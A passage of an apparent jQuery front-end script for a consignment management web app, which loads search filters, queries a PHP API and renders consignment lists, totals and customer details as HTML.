

function loadConsignmentsPage(client, roleId, userId, dateFrom, dateTo, customer, consignmentStatus, deliveryDateFrom, deliveryDateTo)
{
	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);

	loadConsignmentFilterList();
	document.getElementById("cancelList").value = consignmentStatus;

	if (deliveryDateFrom != "")
	{
		$("#deliveryDateFrom").datepicker('setDate', deliveryDateFrom);
	}

	if (deliveryDateTo != "")
	{
		$("#deliveryDateTo").datepicker('setDate', deliveryDateTo);
	}

	$("#dateFrom").datepicker({
		dateFormat: 'yy-mm-dd',
		onSelect: function (date) {
			var dateTo = $('#dateTo');
			var startDate = $(this).datepicker('getDate');
			dateTo.datepicker('option', 'minDate', startDate);
		}
	});

	$("#dateTo").datepicker({ dateFormat: 'yy-mm-dd' });
	$("#dateFrom").datepicker('setDate', dateFrom);
	$("#dateTo").datepicker('setDate', dateTo);
	$("#dateTo").datepicker('option', 'minDate', dateFrom);

	var data = encodeURIComponent('{"getAllSalespersonCustomerlist_data" :{ "salespersonid":"' + userId + '","client":"' + client + '"}}');

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=getAllSalespersonCustomerlist",
		success: function (msg)
		{
			var decodedJson = JSON.parse(msg);
			var data = decodedJson.data;

			for (var element in data)
			{
				if (data[element].value == customer)
				{
					$("#customerList").val(data[element].label);
					$("#customerListID").val(data[element].value);
				}
			}

			$('#customerList').autocomplete({
				source: data,
				select: function (event, ui) {
					event.preventDefault();
					$("#customerList").val(ui.item.label); // display the selected text
					$("#customerListID").val(ui.item.value); // save selected id to hidden input
				}
			});

			searchConsignment(roleId, userId, client);
		},
		error: function (xhr, ajaxOptions, thrownError) {

		}
	})
}


function searchConsignment(roleId, userId, client)
{
	// get selected value of 4 drop down list
	if ($('#consignment-cancel-check').is(':checked'))
	{
		var showCancel = 1;
	}
	else
	{
		var showCancel = 0;
	}

	var selectedSalespersonId = userId;
	var datenewp = document.getElementById('curdate').value;
	sessionStorage.setItem("visited", datenewp);

	var datedeli = document.getElementById('curdate2').value;
	sessionStorage.setItem("deliverys", datedeli);

	var dateFrom = $('#dateFrom').val();
	var dateTo = $('#dateTo').val()
	var deliveryDateFrom = $('#deliveryDateFrom').val();
	var deliveryDateTo = $('#deliveryDateTo').val()
	var consignmentList = document.getElementById("cancelList");
	var consignmentStatus = consignmentList.options[consignmentList.selectedIndex].value;
	var customerList = document.getElementById("customerList");
	var customerStatus = '';

	if (customerList.value != "")
	{
		customerStatus = $('#customerListID').val();
	}

	if (deliveryDateFrom == '' && deliveryDateTo == '' && dateFrom == '' && dateTo == '' && consignmentStatus == '' && customerStatus == '')
	{
		alert("Please select a criteria to start search");
		spinner.stop();
		$('#mydiv').remove();

		return;
	}

	var data = encodeURIComponent('{"searchConsignments_data" :{ "salespersonId":"' + selectedSalespersonId + '","showCancel":"' + showCancel
		+ '","dateFrom":"' + dateFrom + '","dateTo":"' + dateTo + '","consignment_status":"'
		+ consignmentStatus + '","customer_status":"' + customerStatus
		+ '","deliveryDateFrom":"' + deliveryDateFrom + '","deliveryDateTo":"' + deliveryDateTo + '","client":"' + client + '"}}');

	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=searchConsignments",
		success: function (msg)
		{
			/*spinner.stop();
			$('#mydiv').remove();
			$('#mydiv').remove();
			var div = document.getElementById('tmp');
			div.innerHTML += msg;
			return;*/


			var decodedJson = JSON.parse(msg);

			//console.warn(JSON.stringify(decodedJson)+'....<');

			var data = decodedJson.currency_data;
			var currency = '';

			for (var i = 0; i < data.length; i++)
			{
				currency = data[i].currency;
			}

			document.getElementById("currency").value = currency;
			var data = decodedJson.data;
			var deliveryInfo = decodedJson.delivery_info;
			var enable_deliver_date = decodedJson.enable_deliver_date;

			if (data != false && data != undefined)
			{
				$('#consignmentsTableId').empty();
				$('#consignmentsTableQNEId').empty();
				$('#consignmentsTableComfirmedId').empty();

				initConsignmentTable(data, roleId, userId, deliveryInfo, enable_deliver_date, client);
			}
			else
			{
				$('#consignmentsTableId').empty();
				$('#consignmentsTableQNEId').empty();
				$('#consignmentsTableComfirmedId').empty();
			}

			spinner.stop();
			$('#mydiv').remove();
			$('#mydiv').remove();
		},
		error: function (xhr, ajaxOptions, thrownError)
		{
			spinner.stop();
			$('#mydiv').remove();
		}
	});
}

function initConsignmentTable(data, roleId, userId, deliveryInfo, enable_deliver_date, client)
{
	var currency = document.getElementById("currency").value;

	var header = '<tr class="consignmentTableHeader"><td style="text-align:left; padding-left:5px;">No.</td><td style="text-align:left; padding-left:5px;">Sales Consignment No</td>'
		+ '<td style="text-align:left; padding-left:5px;">Created Date</td><td style="text-align:left; padding-left:5px;">Sales Agent</td>'
		+ '<td style="text-align:left; padding-left:5px;">Total Amount</td><td style="text-align:left;">Last Update (Agent)</td><td style="text-align:left;">Internal Last Update</td>'
		+ '<td style="text-align:left; padding-left:5px;">Status</td><td style="text-align:left; padding-left:5px;">Picking Status</td></tr>';

	var header2 = '<tr class="consignmentTableHeader"><td style="text-align:left; padding-left:5px;">No.</td><td style="text-align:left; padding-left:5px;">Sales Consignment No</td>'
		+ '<td style="text-align:left; padding-left:5px;">Created Date</td><td style="text-align:left; padding-left:5px;">Sales Agent</td>'
		+ '<td style="text-align:left; padding-left:5px;">Total Amount</td><td style="text-align:left;">Last Update (Agent)</td><td style="text-align:left;">Internal Last Update</td>'
		+ '<td style="text-align:left; padding-left:5px;">Picking Status</td><td style="text-align:left; padding-left:5px;"></td></tr>';

	var consignmentkey = 0;
	var comfirmkey = 0;
	var sentkey = 0;
	var totalAmount_cart = 0;
	var totalAmount_confirmed = 0;
	var totalAmount_qne = 0;

	for (var i = 0; i < data.length; i++)
	{
		var consignmentId = data[i].consignment_id;
		var cust_company_name = data[i].cust_company_name;
		var branch_name = data[i].branch_name ? ' ('+data[i].branch_name+')' : '';
		var consignmentDate = data[i].consignment_date;
		var deliveryDate = data[i].delivery_date;
		var salesAgent = data[i].sales_agent
		var grandTotal = data[i].grand_total;
		var consignmentStatus = data[i].consignment_status;
		var cancelStatus = data[i].cancel_status;
		var packingStatus = data[i].packing_status;
		var consignmentStatusLastUpdateDate = data[i].consignment_status_last_update_date;
		var consignmentStatusLastUpdateBy = data[i].consignment_status_last_update_by;
		var consignmentInternalUpdate = data[i].internal_updated_at;
		var consignmentDeliveryNote = data[i].consignment_delivery_note;
		var statusMsg, lastUpdateByWhenAndWho = '';
		var deliveryMessage = data[i].delivery_info;
		var consignment_type = data[i].consignment_type ? parseInt(data[i].consignment_type) === 1 ? '<strong style="font-size:15px;">(Return Consignment)</strong>' : '<strong style="font-size:15px;">(New Consignment)</strong>' : '';

		consignmentStatusLastUpdateDate = consignmentStatusLastUpdateDate;
		lastUpdateByWhenAndWho = consignmentStatusLastUpdateBy + '| ' + consignmentInternalUpdate;
		consignmentDate = consignmentDate.substr(0, 10);

		if (consignmentStatus == 0)
		{
			consignmentkey += 1;

			if (cancelStatus == 0)
			{
				totalAmount_cart += Number(grandTotal);
				cancelStatus = '<td style="padding:5px; border:none ;width:8%;" class="cancelStatus"> Active <br><b style="background-color:yellow;">';

				if (enable_deliver_date == 1)
				{
					cancelStatus += '<br>Delivery date :' + deliveryDate+'['+ consignmentDeliveryNote+']';
				}

				cancelStatus += ' </b></td>';
			}
			else if (cancelStatus == 1)
			{
				grandTotal = 0;
				cancelStatus = '<td style="padding:5px; border:none ;width:8%; color:red;" class="cancelStatus"><i>Deleted by agent</i></td>';
			}
			else
			{
				grandTotal = 0;
				cancelStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="cancelStatus"><i>Deleted by admin</i></td>';
			}

			if (packingStatus == 1)
			{
				packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"><strong style="font-size: 20px;">Completed</strong></td>';
			}
			else if (packingStatus == 2)
			{
				packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"><strong style="font-size: 20px;">Completed (partial no stock)</strong></td>';
			}
			else
			{
				packingStatus = '<td style="padding:5px; border:none ;width:8%; color:red;" class="packingStatus"><strong style="font-size: 20px;">!!!</strong></td>';
			}

			var newrecord = '<a class="list-group-item" style="margin-left:-5%;margin-right:-5%;margin-top:-5%;" >'
				+ '<h3 class="list-group-item-heading" onclick="redirectToViewConsignmentPage(\'form' + i + '\')" style="text-decoration: underline;"  >' + cust_company_name + branch_name + '</h3>'
				+ '<p onclick="redirectToViewConsignmentPage(\'form' + i + '\')" >'
				+ '  <form style="display: hidden" action="newviewConsignmentPage.php" method="POST" id="form' + i + '">'
				+ '    <input type="hidden" id="consignmentId" name="consignmentId" value="' + consignmentId + '"/>'
				+ '    <input type="hidden" id="currency" name="currency" value="' + currency + '"/>'
				+ '		<input type="hidden" id="roleId" name="roleId" value="' + roleId + '"/>'
				+ '		<input type="hidden" id="userId" name="userId" value="' + userId + '"/>'
				+ '		<input type="hidden" id="client" name="client" value="' + client + '"/>'
				+ '  </form>'
				+ '</p>'
				+ '  <p  class="list-group-item-text" style="color:#337AB7" >'+ consignment_type +' Create :' + consignmentDate + '</p>'
				+ '  <p class="list-group-item-text">Last Update :' + salesAgent + ' | ' + consignmentStatusLastUpdateDate + '</p>'
				+ '  <p class="list-group-item-text">Internal Update :' + lastUpdateByWhenAndWho + '</p>'
				+ '  <p class="list-group-item-text" style="color:#FF0000;">' + cancelStatus + ' </p>'
				+ '	<p class="list-group-item-text" style="color:#FF0000;">' + packingStatus + ' </p>'
				+ '  <h3 class="list-group-item-text">Total :' + currency + '' + Number(grandTotal).toFixed(2) + '</h3>'
				+ '<br></a>';

			$('#consignmentsTableId').append(newrecord);
		}
		else if (consignmentStatus == 1)
		{
			comfirmkey += 1;

			if (cancelStatus == 0)
			{
				totalAmount_confirmed += Number(grandTotal);
				cancelStatus = '<td style="padding:5px; border:none ;width:15%;" class="cancelStatus"><b style="background-color:yellow;">';

				if (enable_deliver_date == 1)
				{
					cancelStatus += '<br>Delivery Date :' + deliveryDate +'['+ consignmentDeliveryNote+']';
				}

				cancelStatus += ' </b>';

				if (deliveryInfo == 1)
				{
					var deliveryPlaceholder = '1. lorry plate no. \n2. lorry driver. \n3. delivery date. \n4. lorry contact';
					cancelStatus += '<br><div id="delivery-info-' + consignmentId + '">';

					if (deliveryMessage == null)
					{
						deliveryMessage = '';
					}
					else
					{
						cancelStatus += '<span class="glyphicon glyphicon-ok" aria-hidden="true"> </span>';
					}

					cancelStatus += '<button class="btn btn-primary" type="button" style="width:100px;height:30px;border-radius: 25px;"  onclick="openMessageBoxDelivery2(\'' + consignmentId + ',desktop\')" >Delivery Info</button></div>';
					cancelStatus += '<div id="message-popup-' + consignmentId + '" title="Delivery Info for consignment ' + consignmentId + '" style="display:none;"><p id="text-message" style="width:350px;height:200px;" placeholder="' + deliveryPlaceholder + '">' +
						deliveryMessage + '</p></div>';console.log(consignmentId);
				}

				cancelStatus += '</td>'
			}
			else if (cancelStatus == 1)
			{
				grandTotal = 0;
				cancelStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="cancelStatus"><i>Deleted by agent</i></td>';
			}
			else
			{
				grandTotal = 0;
				cancelStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="cancelStatus"><i>Deleted by admin</i></td>';
			}

			if (packingStatus == 1)
			{
				packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"><strong style="font-size: 20px;">Completed</strong></td>';
			}
			else if (packingStatus == 2)
			{
				packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"><strong style="font-size: 20px;">Completed (partial no stock)</strong></td>';
			}
			else
			{
				packingStatus = '<td style="padding:5px; border:none ;width:8%; color:red;" class="packingStatus"><strong style="font-size: 20px;">!!!</strong></td>';
			}

			var newrecord = '<a class="list-group-item" style="margin-left:-5%;margin-right:-5%;margin-top:-5%;" >'
				+ '<h3 class="list-group-item-heading" onclick="redirectToViewConsignmentPage(\'form' + i + '\')" style="text-decoration: underline;">' + cust_company_name + branch_name + '</h3>'
				+ '<p onclick="redirectToViewConsignmentPage(\'form' + i + '\')" >'
				+ '  <form style="display: hidden" action="newviewConsignmentPage.php" method="POST" id="form' + i + '">'
				+ '    <input type="hidden" id="consignmentId" name="consignmentId" value="' + consignmentId + '"/>'
				+ '    <input type="hidden" id="currency" name="currency" value="' + currency + '"/>'
				+ '		<input type="hidden" id="roleId" name="roleId" value="' + roleId + '"/>'
				+ '		<input type="hidden" id="userId" name="userId" value="' + userId + '"/>'
				+ '		<input type="hidden" id="client" name="client" value="' + client + '"/>'
				+ '  </form>'
				+ '</p>'
				+ '  <p  class="list-group-item-text" style="color:#337AB7" >'+ consignment_type +' Create :' + consignmentDate + '</p>'
				+ '  <p class="list-group-item-text">Last Update :' + salesAgent + ' | ' + consignmentStatusLastUpdateDate + '</p>'
				+ '  <p class="list-group-item-text">Internal Update :' + lastUpdateByWhenAndWho + '</p>'
				+ '  <p class="list-group-item-text" style="color:#FF0000;"> ' + cancelStatus + ' </p>'
				+ '	<p class="list-group-item-text" style="color:#FF0000;">' + packingStatus + ' </p>'
				+ '  <h3 class="list-group-item-text">Total :' + currency + '' + Number(grandTotal).toFixed(2) + '</h3>'
				+ '<br></a>';

			$('#consignmentsTableComfirmedId').append(newrecord);
		}
		else if (consignmentStatus == 2)
		{
			totalAmount_qne += Number(grandTotal);
			sentkey += 1;

			if (packingStatus == 1)
			{
				packingStatus = '<td style="padding:5px; border:none ;width:15%;" class="packingStatus"><strong style="font-size: 20px;">Completed</strong><br><b style="background-color:yellow;">';

				if (enable_deliver_date == 1)
				{
					packingStatus += '<br>Delivery Date :' + deliveryDate+'['+ consignmentDeliveryNote+']';
				}

				packingStatus += ' </b>';
			}
			else if (packingStatus == 2)
			{
				packingStatus = '<td style="padding:5px; border:none ;width:15%;" class="packingStatus"><strong style="font-size: 20px;">Completed (partial no stock)</strong><br><b style="background-color:yellow;">';

				if (enable_deliver_date == 1)
				{
					packingStatus += '<br>Delivery Date :' + deliveryDate+'['+ consignmentDeliveryNote+']';
				}

				packingStatus += ' </b>';
			}
			else
			{
				packingStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="packingStatus"><strong style="font-size: 20px;">!!!</strong><br><b style="background-color:yellow;">';

				if (enable_deliver_date == 1)
				{
					packingStatus += '<br>Delivery Date :' + deliveryDate+'['+ consignmentDeliveryNote+']';
				}

				packingStatus += ' </b>';
			}

			if (deliveryInfo == 1)
			{
				var deliveryPlaceholder = '1. lorry plate no. \n2. lorry driver. \n3. delivery date. \n4. lorry contact';
				packingStatus += '<br><div id="delivery-info-' + consignmentId + '">';

				if (deliveryMessage == null)
				{
					deliveryMessage = '';
				}
				else
				{
					packingStatus += '<span class="glyphicon glyphicon-ok" aria-hidden="true"> </span>';
				}

				packingStatus += '<button class="btn btn-primary" type="button" style="width:100px;height:30px;border-radius: 25px;"  onclick="openMessageBoxDelivery2(\'' + consignmentId + ',desktop\')" >Delivery Info</button></div>';
				packingStatus += '<div id="message-popup-' + consignmentId + '" title="Delivery Info for consignment ' + consignmentId + '" style="display:none;"><p id="text-message" style="width:350px;height:200px;" placeholder="' + deliveryPlaceholder + '">' +
					deliveryMessage + '</p></div>';
			}

			packingStatus += '</td>'

			var newrecord = '<a class="list-group-item" style="margin-left:-5%;margin-right:-5%;margin-top:-5%;" >'
				+ '<h3 class="list-group-item-heading" onclick="redirectToViewConsignmentPage(\'form' + i + '\')" style="text-decoration: underline;">' + cust_company_name + branch_name + '</h3>'
				+ '<p onclick="redirectToViewConsignmentPage(\'form' + i + '\')" >'
				+ '  <form style="display: hidden" action="newviewConsignmentPage.php" method="POST" id="form' + i + '">'
				+ '    <input type="hidden" id="consignmentId" name="consignmentId" value="' + consignmentId + '"/>'
				+ '    <input type="hidden" id="currency" name="currency" value="' + currency + '"/>'
				+ '		<input type="hidden" id="roleId" name="roleId" value="' + roleId + '"/>'
				+ '		<input type="hidden" id="userId" name="userId" value="' + userId+ '"/>'
				+ '		<input type="hidden" id="client" name="client" value="' + client + '"/>'
				+ '  </form>'
				+ '</p>'
				+ '  <p  class="list-group-item-text" style="color:#337AB7" >'+ consignment_type +' Create :' + consignmentDate + '</p>'
				+ '  <p class="list-group-item-text"> Last Update :' + salesAgent + ' | ' + consignmentStatusLastUpdateDate + '</p>'
				+ '  <p class="list-group-item-text"> Internal Update : ' + lastUpdateByWhenAndWho + '</p>'
				+ '  <p class="list-group-item-text" style="color:#FF0000;"> ' + packingStatus + ''
				+ '  </p>'
				+ '  <h3 class="list-group-item-text">Total :' + currency + '' + Number(grandTotal).toFixed(2) + '</h3>'
				+ '<br></a>';

			$('#consignmentsTableQNEId').append(newrecord);
		}
	}

		record = '';

		newrecord = '<h4 class="list-group-item-text" align="right"><b>TOTAL :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' + currency + ' ' + Number(totalAmount_cart).toFixed(2) + '</b></h4>';
		$('#consignmentsTableId').append(newrecord);

		newrecord = '<h4 class="list-group-item-text" align="right"><b>TOTAL :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' + currency + ' ' + Number(totalAmount_confirmed).toFixed(2) + '</b></h4>';
		$('#consignmentsTableComfirmedId').append(newrecord);

		record = '<tr><td style="padding:5px;border:none; width:3%; text-align:left;">' +
			'.</td><td style="padding:5px;border:none; width:12%; text-align:left;"></td>' +
			'<td style="padding:5px;border:none; width:12%; text-align:left;">' +
			'</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
			'Total:</td><td style="padding:5px;border:none; width:12%; text-align:left;">'
			+ currency + " " + Number(totalAmount_qne).toFixed(2) +
			'</td><td style="padding:5px;border:none; width:15%; text-align:left;"></td>'
			+ '<td style="padding:5px;border:none; width:17%; text-align:left;" ></td>'
			+ '<td style="padding:5px; border:none ;width:8%; "></td></tr>';

		newrecord = '<h4 class="list-group-item-text" align="right"><b>TOTAL :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' + currency + ' ' + Number(totalAmount_qne).toFixed(2) + '</b></h4>';

		$('#consignmentsTableQNEId').append(newrecord);
}

function redirectToViewConsignmentPage(formId)
{
	formId = "#" + formId;
	$(formId).submit();
}

function loadConsignmentFilterList()
{
	var header = "<option value=''>-Select Consignment Status-</option>";
	var consignmentStatus = ["Active", "Delete by Agent", "Delete by Admin"];

	$('#cancelList').append(header);

	for(var i = 0; i <3; i++)
	{
		var value = "<option value='" + i + "'>" + consignmentStatus[i] + "</option>";
		$('#cancelList').append(value);
	}
}

function loadViewConsignmentPage(roleId, consignmentId, userId, currency, client)
{
	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);

	getConsignmentStatusAndConsignmentDetailInOneTime(consignmentId, currency, userId, client);
}

function getConsignmentStatusAndConsignmentDetailInOneTime(consignmentId, currency, userId, client)
{
	var data = encodeURIComponent('{"getConsignmentStatusAndConsignmentDetailInOneTime_data" :{ "consignmentId":"' + consignmentId
	+ '","client":"' + client + '"}}');

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=getConsignmentStatusAndConsignmentDetailInOneTime",
		success: function (msg)
		{
			var decodedJson = JSON.parse(msg);

			if (data != false && data != undefined)
			{
				localStorage["consignmentStatusArray"] = JSON.stringify(data);
			}

			var data = decodedJson.consignment_data;

			if (data != false && data != undefined)
			{
				for (var i = 0; i < data.length; i++) {
					var consignmentId = data[i].consignment_id;
					var consignmentDate = data[i].consignment_date;
					var custCompName = data[i].cust_company_name;
					var custInchargePerson = data[i].cust_incharge_person;
					var grandTotal = data[i].grand_total;
					grandTotal = (+grandTotal).toFixed(2);
					var consignmentStatus = data[i].consignment_status;
					var cancelStatus = data[i].cancel_status;
					var packingStatus = data[i].packing_status;
					var othersOrderStatus = data[i].others_consignment_status;
					var consignmentStatusLastUpdateDate = data[i].consignment_status_last_update_date;
					var consignmentStatusLastUpdateBy = data[i].consignment_status_last_update_by;
					var delivery_date = data[i].delivery_date;

					var customerCode = data[i].cust_code;
					var customerFax = data[i].cust_fax;
					var customerTel = data[i].cust_tel;
					var customerEmail = data[i].cust_email;
					var customerReference = data[i].cust_reference;
					var salespersonId = data[i].salesperson_id;
					var salesagent = data[i].sales_agent;

					var shippingAddr1 = data[i].shipping_address1;
					var shippingAddr2 = data[i].shipping_address2;
					var shippingAddr3 = data[i].shipping_address3;
					var shippingAddr4 = data[i].shipping_address4;
					var billingAddr1 = data[i].billing_address1;
					var billingAddr2 = data[i].billing_address2;
					var billingAddr3 = data[i].billing_address3;
					var billingAddr4 = data[i].billing_address4;

					var billing_address = billingAddr1+billingAddr2+billingAddr3+billingAddr4;

					var shippingCity = data[i].shipping_city;
					var shippingState = data[i].shipping_state;
					var shippingZipcode = data[i].shipping_zipcode;
					var shippingCountry = data[i].shipping_country;

					var billingCity = data[i].billing_city;
					var billingState = data[i].billing_state;
					var billingZipcode = data[i].billing_zipcode;
					var billingCountry = data[i].billing_country;

					var consignmentTotalDiscount = data[i].total_discount;
					var consignmentTotalDiscountMethod = data[i].discount_method;

					var consignment_remark = data[i].consignment_remark;
					var consignment_validity = data[i].consignment_validity;
					var consignment_payment_type = data[i].consignment_payment_type;
					var consignment_reference = data[i].consignment_reference;
					var consignment_delivery_note = data[i].consignment_delivery_note;

					var shippingFee = data[i].shippingfee;
					var tax = data[i].tax;

					var consignmentItemList = data[i].consignmentItemArr;
					var showAgent = '';
					var showPicking = '';

					var decimal_point = parseInt(data[i].decimal_point);
					var accounting_software = data[i].accounting_software;
					var gst_rate = parseFloat(data[i].gst_rate);

					var record = '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Code</td><td style="width:1%;">:</td><td style="width:32%;">' + customerCode + '</td></tr><tr><td style="width:17%; padding-left:15px;">Billing State</td><td style="width:1%;">:</td><td style="width:32%;">' + billingState + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Cust. Company Name</td><td style="width:1%;">:</td><td style="width:32%;">' + custCompName + '</td><td style="width:17%; padding-left:15px;">Billing Zipcode</td><td style="width:1%;">:</td><td style="width:32%;">' + billingZipcode + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">P.I.C</td><td style="width:1%;">:</td><td style="width:32%;">' + custInchargePerson + '</td><td style="width:17%; padding-left:15px;">Billing Country</td><td style="width:1%;">:</td><td style="width:32%;">' + billingCountry + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Reference</td><td style="width:1%;">:</td><td style="width:32%;">' + customerReference + '</td><td style="width:17%; padding-left:15px;">Shipping Address 1</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingAddr1 + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Email</td><td style="width:1%;">:</td><td style="width:32%;">' + customerEmail + '</td><td style="width:17%; padding-left:15px;">Shipping Address 2</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingAddr2 + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Tel</td><td style="width:1%;">:</td><td style="width:32%;">' + customerTel + '</td><td style="width:17%; padding-left:15px;">Shipping Address 3</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingAddr3 + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Fax</td><td style="width:1%;">:</td><td style="width:32%;">' + customerFax + '</td><td style="width:17%; padding-left:15px;">Shipping City</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingCity + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing Address 1</td><td style="width:1%;">:</td><td style="width:32%;">' + billingAddr1 + '</td><td style="width:17%; padding-left:15px;">Shipping State</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingState + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing Address 2</td><td style="width:1%;">:</td><td style="width:32%;">' + billingAddr2 + '</td><td style="width:17%; padding-left:15px;">Shipping Zipcode</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingZipcode + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing Address 3</td><td style="width:1%;">:</td><td style="width:32%;">' + billingAddr3 + '</td><td style="width:17%; padding-left:15px;">Shipping Country</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingCountry + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing City</td><td style="width:1%;">:</td><td style="width:32%;">' + billingCity + '</td><td style="width:17%; padding-left:15px;">Salesperson ID</td><td style="width:1%;">:</td><td style="width:32%;">' + salespersonId + '</td></tr>'
						+ '<tr><td style="height:10px"></td></tr>';

					$('#viewOrderCustInfoTable').append(record);
					$('#custname').append(custCompName);
					$('#billingaddr').append(billing_address);
					$('#deliveryDate').append(delivery_date);

					var displayReceivedDate = '';
					var displayReceivedBy = '';
					var displayStatus = '<select id="consignmentStatusDropDownList" style="width:100px;">';
					var otherStatusField = '';
					var consignmentStatusName = '';

					$('#salesOrderId').html(consignmentId);
					$('#salesAgent').html(salesagent);
					$('#custName').html(custCompName);
					$('#createdDate').html(consignmentDate.substr(0, 10));
					$('#deliveryNote').html(consignment_delivery_note);

					if (consignmentStatus == 0)
					{
						$('#reserved').css("color", "red");
					}
					else if (consignmentStatus == 1)
					{
						$('#confirmed').css("color", "red");
					}
					else
					{
						$('#toQNE').css("color", "red");
					}

					var TotalOfSubTotal = 0;
					var TotalDiscount = 0;

					var totalItems = consignmentItemList.length;
					$('#totalOrderItems').append(totalItems);

					var jsonResult = JSON.stringify(consignmentItemList);
					$('#consignmentItem').append(jsonResult);

					for (var j = 0; j < consignmentItemList.length; j++)
					{
						var consignmentItemId = consignmentItemList[j].consignment_item_id;
						var itemCancelStatus = consignmentItemList[j].cancel_status;
						var itemPackingStatus = consignmentItemList[j].packing_status;

						var itemSalespersonRemark = consignmentItemList[j].salesperson_remark;

						itemSalespersonRemark = itemSalespersonRemark ? ('<mark>'+itemSalespersonRemark+'</mark>') : '<p>  </p>';

						var discountMethod = consignmentItemList[j].discount_method;
						var displayDiscountMethodAndPrice = '';
						//console.log(discountMethod);
						if (discountMethod == 'MoneyDiscountType') {
							displayDiscountMethodAndPrice = +consignmentItemList[j].discount_amount;
						}
						else if (discountMethod == 'PercentDiscountType') {
							displayDiscountMethodAndPrice = (+consignmentItemList[j].quantity * +consignmentItemList[j].unit_price) - +consignmentItemList[j].sub_total;
							displayDiscountMethodAndPrice = displayDiscountMethodAndPrice.toFixed(2);

						}

						var displayDiscount = (+displayDiscountMethodAndPrice).toFixed(2);

						if (accounting_software == 'abswin') {
							var disc_1 = consignmentItemList[j].disc_1;
							var disc_2 = consignmentItemList[j].disc_2;
							var disc_3 = consignmentItemList[j].disc_3;
							displayDiscountMethodAndPrice = disc_1 + '/' + disc_2 + '/' + disc_3;
						}

						var displayOrderDate = consignmentDate.substr(0, 10);
						var displayReceiveDate = consignmentStatusLastUpdateDate.substr(0, 10);

						if (displayReceiveDate == '0000-00-00') {
							displayReceiveDate = '-';
						}

						var itemPriceDefault = (+consignmentItemList[j].unit_price).toFixed(2) + ' / ' + consignmentItemList[j].unit_uom;


						var consignmentNo = j + 1
						var displayQuantity = consignmentItemList[j].quantity;
						if (itemCancelStatus == 1 || cancelStatus == 1 || cancelStatus == 2) {
							var showAgent = '<td style="width:12%; text-align:left; color:red;" class="agent_status"><i>Removed</i></td>';
							var showPicking = '<td style="width:15%; text-align:left; color:red;" class="packing_status"><i>Removed</i></td>';
							var showPickingnew = '<p class="list-group-item-text" style="color:red;">Removed</p>';
							var showAgentnew = '<p class="list-group-item-text" style="color:red;">Removed</p>';
						}
						else {
							if (itemPackingStatus == 1 || itemPackingStatus == 0) {
								TotalOfSubTotal = parseFloat(TotalOfSubTotal) + parseFloat(consignmentItemList[j].sub_total);
								TotalDiscount = parseFloat(TotalDiscount) + parseFloat(displayDiscount);
							}
							if (consignmentStatus == 0) {
								var showAgent = '<td style="width:12%; text-align:left; " class="agent_status">Reserved</td>';
